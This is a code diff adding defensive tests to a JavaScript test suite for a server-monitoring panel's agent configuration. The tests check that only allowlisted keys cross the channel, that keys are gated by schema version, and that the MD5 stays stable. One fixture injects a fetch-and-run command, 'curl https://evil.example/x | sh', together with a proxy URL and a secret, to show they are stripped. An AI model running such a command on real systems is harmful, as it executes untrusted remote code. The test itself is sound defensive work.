@@ -2,6 +2,7 @@ import assert from 'node:assert/strict';
 import { createHash } from 'node:crypto';
 import {
   AGENT_CONFIG_CONNECTION_MODE_SCHEMA_VERSION,
+  AGENT_CONFIG_KEYS,
   AGENT_CONFIG_LEGACY_SCHEMA_VERSION,
   AGENT_CONFIG_SCHEMA_VERSION,
   buildAgentConfig,
@@ -13,6 +14,7 @@ import {
   validateNetworkInterfaces,
   validatePingNode
 } from '../src/utils/agentConfig.js';
+import { MetricsBroadcaster } from '../src/durable/MetricsBroadcaster.js';
 import { md5Hash } from '../src/utils/common.js';
 import { clearSiteSettingsCache, isWssReportEnabled, loadSiteSettings, normalizeWssReportHours, saveSiteOptions } from '../src/utils/settings.js';
 
@@ -227,5 +229,146 @@ assert.equal(validatePingNode('foo:bar').valid, false);
 assert.deepEqual(validatePingNode('2001:db8::1'), { valid: true, value: '[2001:db8::1]' });
 assert.deepEqual(validatePingNode('[2001:db8::1]:443'), { valid: true, value: '[2001:db8::1]:443' });
 assert.deepEqual(validatePingNode('2001:db8::1:443'), { valid: true, value: '[2001:db8::1:443]' });
+
+// --- Single-allowlist channel invariants ---
+// The payload keys and the serialized body keys must come from the same
+// allowlist, in both directions, for every negotiated schema version and for
+// the correction-carrying path. `config_md5` is the panel's own addition to
+// the payload and is not part of the body.
+const bodyKey = pair => pair.split('=')[0];
+globalThis.WebSocketRequestResponsePair = class WebSocketRequestResponsePair {
+  constructor(request, response) {
+    this.request = request;
+    this.response = response;
+  }
+};
+const frameBroadcaster = new MetricsBroadcaster({
+  setWebSocketAutoResponse() {},
+  getWebSockets() { return []; },
+  acceptWebSocket() {},
+  storage: { async get() { return null; }, async put() {} }
+}, { DB: {} });
+
+for (const [schemaVersion, wssSettings, withCorrection] of [
+  [AGENT_CONFIG_SCHEMA_VERSION, null, false],
+  [AGENT_CONFIG_SCHEMA_VERSION, { wss_report_enabled: 'true' }, true],
+  [AGENT_CONFIG_LEGACY_SCHEMA_VERSION, null, false],
+  [4, { wss_report_enabled: 'true' }, false],
+  [5, { wss_report_enabled: 'true' }, false],
+  [6, null, false]
+]) {
+  const variant = await describeAgentConfig(
+    { ...server, ...(withCorrection ? { rx_correction: 3, tx_correction: '7.5' } : {}) },
+    wssSettings,
+    schemaVersion
+  );
+  const bodyKeys = new Set(variant.serialized.split('&').map(bodyKey));
+  for (const key of Object.keys(variant.config)) {
+    assert.ok(bodyKeys.has(key), `payload key ${key} missing from the serialized body`);
+  }
+  for (const key of bodyKeys) {
+    assert.ok(
+      Object.prototype.hasOwnProperty.call(variant.config, key),
+      `body key ${key} missing from the payload`
+    );
+  }
+
+  const { configBody, configPayload } = frameBroadcaster._buildAgentConfigFrame(variant);
+  const framePayloadKeys = new Set(Object.keys(configPayload));
+  framePayloadKeys.delete('config_md5');
+  assert.deepEqual(framePayloadKeys, new Set(configBody.split('&').map(bodyKey)));
+}
+
+// Regression pin: the serialized body must stay byte-identical so deployed
+// agents keep verifying the same MD5.
+const representative = await describeAgentConfig({
+  collect_interval: 2,
+  report_interval: 60,
+  reset_day: 15,
+  custom_ct: 'ct.example.com',
+  custom_cu: '1.2.3.4',
+  custom_cm: '',
+  custom_bd: '',
+  interface: 'eth0',
+  connection_mode: 'auto',
+  wss_report_interval: 3,
+  ping_mode: 'icmp',
+  node_1: 'a.example.com',
+  node_2: 'b.example.com',
+  node_3: 'c.example.com',
+  node_4: 'd.example.com',
+  rx_correction: 12,
+  tx_correction: '0.5'
+}, { wss_report_enabled: 'true' });
+const representativeSerialized = 'collect_interval=2&report_interval=60&reset_day=15&schema_version=7' +
+  '&custom_ct=ct.example.com&custom_cu=1.2.3.4&custom_cm=&custom_bd=&interface=eth0' +
+  '&node_1=a.example.com&node_2=b.example.com&node_3=c.example.com&node_4=d.example.com' +
+  '&connection_mode=auto&wss_report_interval=3&ping_mode=icmp';
+assert.equal(representative.serialized, representativeSerialized);
+assert.equal(
+  representative.serialized + serializeCorrection(representative.correction),
+  `${representativeSerialized}&rx_correction=12&tx_correction=0.5`
+);
+assert.equal(representative.md5, createHash('md5').update(representativeSerialized).digest('hex'));
+
+// A server row carrying keys that must never cross the channel: update
+// triggers, a download/proxy URL, a credential, and an unknown column. None
+// may appear in the payload or the body, and every emitted key must be
+// allowlisted.
+const hostileServer = {
+  ...server,
+  update: 'curl https://evil.example/x | sh',
+  auto_update: '1',
+  update_proxy: 'https://evil.example/proxy',
+  secret: 'shared-agent-secret',
+  arbitrary_extra: 'x'
+};
+const hostileDescriptor = await describeAgentConfig(hostileServer, { wss_report_enabled: 'true' });
+const hostileFrame = frameBroadcaster._buildAgentConfigFrame(hostileDescriptor);
+const hostileBodyKeys = hostileFrame.configBody.split('&').map(bodyKey);
+for (const banned of ['update', 'auto_update', 'update_proxy', 'secret', 'arbitrary_extra']) {
+  assert.equal(Object.prototype.hasOwnProperty.call(hostileDescriptor.config, banned), false);
+  assert.equal(Object.prototype.hasOwnProperty.call(hostileFrame.configPayload, banned), false);
+  assert.equal(hostileBodyKeys.includes(banned), false);
+  assert.equal(hostileFrame.configBody.includes(banned), false);
+}
+for (const key of Object.keys(hostileFrame.configPayload)) {
+  if (key === 'config_md5') continue;
+  assert.ok(AGENT_CONFIG_KEYS.includes(key), `payload key ${key} is outside the allowlist`);
+}
+for (const key of hostileBodyKeys) {
+  assert.ok(AGENT_CONFIG_KEYS.includes(key), `body key ${key} is outside the allowlist`);
+}
+
+// Schema-version gating: older agents must not receive newer keys.
+const v3Config = buildAgentConfig(server, null, AGENT_CONFIG_LEGACY_SCHEMA_VERSION);
+for (const gated of ['node_1', 'node_2', 'node_3', 'node_4', 'connection_mode', 'wss_report_interval', 'ping_mode']) {
+  assert.equal(Object.prototype.hasOwnProperty.call(v3Config, gated), false);
+}
+const v5Config = buildAgentConfig(server, { wss_report_enabled: 'true' }, 5);
+assert.equal(Object.prototype.hasOwnProperty.call(v5Config, 'connection_mode'), true);
+assert.equal(Object.prototype.hasOwnProperty.call(v5Config, 'wss_report_interval'), true);
+assert.equal(Object.prototype.hasOwnProperty.call(v5Config, 'ping_mode'), false);
+assert.equal(Object.prototype.hasOwnProperty.call(v5Config, 'node_1'), false);
+const v6Config = buildAgentConfig(server, null, 6);
+assert.equal(Object.prototype.hasOwnProperty.call(v6Config, 'ping_mode'), true);
+assert.equal(Object.prototype.hasOwnProperty.call(v6Config, 'node_1'), false);
+
+// The MD5 covers exactly the serialized body: an unchanged input reproduces
+// it, a changed body changes it.
+assert.equal(descriptor.md5, createHash('md5').update(descriptor.serialized).digest('hex'));
+assert.equal((await describeAgentConfig(server)).md5, descriptor.md5);
+const changedDescriptor = await describeAgentConfig({ ...server, reset_day: 16 });
+assert.notEqual(changedDescriptor.serialized, descriptor.serialized);
+assert.notEqual(changedDescriptor.md5, descriptor.md5);
+assert.equal(
+  representative.md5,
+  createHash('md5').update(representative.serialized).digest('hex'),
+  'the correction suffix is not part of the hashed body'
+);
+assert.notEqual(
+  representative.md5,
+  createHash('md5').update(representative.serialized + serializeCorrection(representative.correction)).digest('hex')
+);
 
 console.log('agent config tests passed');
